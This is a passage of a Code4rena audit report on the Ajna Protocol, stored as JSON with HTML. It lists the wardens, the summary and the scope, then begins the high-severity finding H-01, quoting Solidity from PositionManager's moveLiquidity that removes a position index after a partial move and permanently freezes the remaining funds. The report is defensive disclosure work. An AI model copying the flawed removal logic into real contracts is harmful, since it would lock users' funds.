{
  "circa": {
    "title": "Ajna Protocol",
    "sponsor": "Ajna Protocol",
    "slug": "2023-05-ajna",
    "date": "2023-06-29",
    "findings": "https://github.com/code-423n4/2023-05-ajna-findings/issues",
    "contest": 234
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the Ajna Protocol smart contract system written in Solidity. The audit took place between May 3—May 11 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>123 Wardens contributed reports to the Ajna Protocol:</p>\n<ol>\n<li><a href=\"https://twitter.com/3xJanx2009\">0x73696d616f</a></li>\n<li>0xRobocop</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://twitter.com/Stalin_eth\">0xStalin</a></li>\n<li><a href=\"https://twitter.com/MarioPoneder\">0xTheC0der</a></li>\n<li>0xWaitress</li>\n<li>0xcm</li>\n<li><a href=\"https://twitter.com/0xnevi\">0xnev</a></li>\n<li>7siech</li>\n<li><a href=\"https://twitter.com/_onlyowner\">ABAIKUNANBAEV</a></li>\n<li><a href=\"https://twitter.com/Audinarey\">Audinarey</a></li>\n<li><a href=\"https://twitter.com/JP_Courses\">Audit_Avengers</a> (<a href=\"https://twitter.com/JP_Courses\">JP_Courses</a>, <a href=\"https://www.twitter.com/pxng0lin\">pxng0lin</a>, <a href=\"https://www.linkedin.com/in/hamid-abubakr-732901ab/\">zzebra83</a>, Aon_8, and ravikiranweb3)</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>BGSecurity (<a href=\"https://twitter.com/anonresercher\">anonresercher</a> and <a href=\"https://github.com/martin-petrov03\">martin</a>)</li>\n<li>BPZ (Bitcoinfever244, PrasadLak, and zinc42)</li>\n<li>BRONZEDISC</li>\n<li>Bason</li>\n<li><a href=\"https://twitter.com/bauchibred?s=21&#x26;t=7sv-1qcnwtkdTA81Iog0yQ\">Bauchibred</a></li>\n<li><a href=\"https://twitter.com/Aydoanbalakchie\">Blckhv</a></li>\n<li>Brenzee</li>\n<li><a href=\"https://twitter.com/DadeKuma\">DadeKuma</a></li>\n<li>Dug</li>\n<li>Eurovickk</li>\n<li>Evo</li>\n<li>GG_Security (<a href=\"https://twitter.com/georgits_\">georgits</a> and halden)</li>\n<li>Haipls</li>\n<li>J4de</li>\n<li><a href=\"https://twitter.com/0xJCN\">JCN</a></li>\n<li>Jerry0x</li>\n<li>Jiamin</li>\n<li><a href=\"https://twitter.com/TamayoNft\">Jorgect</a></li>\n<li><a href=\"https://twitter.com/0xJuntao\">Juntao</a></li>\n<li><a href=\"https://twitter.com/CrystAlline_K42\">K42</a></li>\n<li><a href=\"https://twitter.com/nonfungiblenero\">Kenshin</a></li>\n<li><a href=\"https://twitter.com/KoolexC\">Koolex</a></li>\n<li>MohammedRizwan</li>\n<li>REACH</li>\n<li>Rageur</li>\n<li>Raihan</li>\n<li>ReyAdmirado</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>SAAJ</li>\n<li>SAQ</li>\n<li>SM3_SS</li>\n<li><a href=\"https://www.linkedin.com/in/sathishkumar-p-26069915a\">Sathish9098</a></li>\n<li><a href=\"https://twitter.com/theshogoki\">Shogoki</a></li>\n<li><a href=\"https://twitter.com/Shaping_Myself\">Shubham</a></li>\n<li>SpicyMeatball</li>\n<li>T1MOH</li>\n<li>TS</li>\n<li><a href=\"https://twitter.com/meidhiwirara\">Tomio</a></li>\n<li><a href=\"https://twitter.com/ToonVH_\">ToonVH</a></li>\n<li>UniversalCrypto (amaechieth and tettehnetworks)</li>\n<li><a href=\"https://twitter.com/VagnerAndrei98\">Vagner</a></li>\n<li>Walter</li>\n<li><a href=\"https://twitter.com/0xaash\">aashar</a></li>\n<li>ast3ros</li>\n<li><a href=\"https://twitter.com/agfviggiano\">aviggiano</a></li>\n<li>ayden</li>\n<li><a href=\"https://twitter.com/azhar0406\">azhar</a></li>\n<li>berlin-101</li>\n<li>btk</li>\n<li><a href=\"https://twitter.com/bytes032\">bytes032</a></li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li>circlelooper</li>\n<li>codeslide</li>\n<li>cryptostellar5</li>\n<li><a href=\"https://twitter.com/deadrosesxyz\">deadrxsezzz</a></li>\n<li>descharre</li>\n<li><a href=\"https://twitter.com/devScrooge\">devscrooge</a></li>\n<li>dicethedev</li>\n<li><a href=\"https://twitter.com/evmboi32\">evmboi32</a></li>\n<li><a href=\"https://twitter.com/father0fBl0cks\">fatherOfBlocks</a></li>\n<li>ginlee</li>\n<li>hals</li>\n<li><a href=\"https://twitter.com/hunt3r_w3b\">hunter_w3b</a></li>\n<li><a href=\"https://twitter.com/0xhyh\">hyh</a></li>\n<li>j4ld1na</li>\n<li><a href=\"https://twitter.com/0xJuancito\">juancito</a></li>\n<li>kaveyjoe</li>\n<li>kenta</li>\n<li>kodyvim</li>\n<li>ktg</li>\n<li>kutugu</li>\n<li><a href=\"https://twitter.com/Xc1008Cui\">ladboy233</a></li>\n<li>lfzkoala</li>\n<li>lukris02</li>\n<li><a href=\"https://twitter.com/0xpathfindr\">mrpathfindr</a></li>\n<li>mrvincere</li>\n<li><a href=\"https://twitter.com/nadin20678790\">nadin</a></li>\n<li><a href=\"https://www.linkedin.com/in/naman-agrawal1778/\">naman1778</a></li>\n<li><a href=\"https://twitter.com/nobody20185\">nobody2018</a></li>\n<li>okolicodes</li>\n<li><a href=\"https://twitter.com/patitonar\">patitonar</a></li>\n<li>peanuts</li>\n<li>petrichor</li>\n<li>pontifex</li>\n<li>rbserver</li>\n<li>ro1sharkm</li>\n<li>rvierdiiev</li>\n<li>sakshamguruji</li>\n<li>sces60107</li>\n<li><a href=\"https://twitter.com/shealtielanz\">shealtielanz</a></li>\n<li><a href=\"https://twitter.com/squeaky_cactus\">squeaky_cactus</a></li>\n<li><a href=\"https://twitter.com/teawaterwire\">teawaterwire</a></li>\n<li><a href=\"https://troublor.xyz\">troublor</a></li>\n<li><a href=\"https://twitter.com/cvetanovv0\">tsvetanovv</a></li>\n<li>vakzz</li>\n<li><a href=\"https://twitter.com/0xVolodya\">volodya</a></li>\n<li><a href=\"https://www.market.dev\">wonjun</a></li>\n<li>xuwinnie</li>\n<li><a href=\"https://twitter.com/yixxas\">yixxas</a></li>\n<li>yjrwkk</li>\n<li>yongskiws</li>\n</ol>\n<p>This audit was judged by <a href=\"https://twitter.com/thePicodes\">Picodes</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 25 unique vulnerabilities. Of these vulnerabilities, 11 received a risk rating in the category of HIGH severity and 14 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 54 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 32 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-05-ajna\">C4 Ajna Protocol repository</a>, and is composed of 11 smart contracts written in the Solidity programming language and includes 1,391 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-11\" style=\"position:relative;\"><a href=\"#high-risk-findings-11\" aria-label=\"high risk findings 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (11)</h1>\n<h2 id=\"h-01-positionmanagers-moveliquidity-can-freeze-funds-by-removing-destination-index-even-when-the-move-was-partial\" style=\"position:relative;\"><a href=\"#h-01-positionmanagers-moveliquidity-can-freeze-funds-by-removing-destination-index-even-when-the-move-was-partial\" aria-label=\"h 01 positionmanagers moveliquidity can freeze funds by removing destination index even when the move was partial permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/503\">[H-01] PositionManager’s <code>moveLiquidity</code> can freeze funds by removing destination index even when the move was partial</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/503\">hyh</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/366\">Koolex</a> and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/232\">Haipls</a></em></p>\n<p><code>positionIndex.remove(params_.fromIndex)</code>removes the PositionManager entry even when it is only partial removal as a result of <code>IPool(params_.pool).moveQuoteToken(...)</code> call.</p>\n<p>I.e. it is correct to do <code>fromPosition.lps -= vars.lpbAmountFrom</code>, but the resulting amount might not be zero, moveQuoteToken() are not guaranteed to clear the position as it has available liquidity constraint. In the case of partial quote funds removal <code>positionIndex.remove(params_.fromIndex)</code> operation will freeze the remaining position.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Permanent fund freeze for the remaining position of LP beneficiary.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>While <code>positions[params_.tokenId][params_.fromIndex]</code> LP shares are correctly reduced by the amount returned by pool’s moveQuoteToken(), the position itself is unconditionally removed from the <code>positionIndexes[params_.tokenId]</code>, making any remaining funds unavailable:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">moveLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MoveLiquidityParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mayInteract</span><span class=\"mtk1\">(params_.pool, params_.tokenId) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MoveLiquidityLocalVars</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// handle the case where owner attempts to move liquidity after they&#39;ve already done so</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ensure bucketDeposit accounts for accrued interest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateInterest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// retrieve info of bucket from which liquidity is moved  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">bucketInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that bucket hasn&#39;t gone bankrupt since memorialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BucketBankrupt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the max amount of quote tokens that can be moved, given the tracked LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxQuote</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_lpToQuoteToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_priceAt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">EnumerableSet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">UintSet</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positionIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// remove bucket index from which liquidity is moved from tracked positions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update bucket set at which a position has liquidity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// slither-disable-next-line unused-return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// move quote tokens in pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span 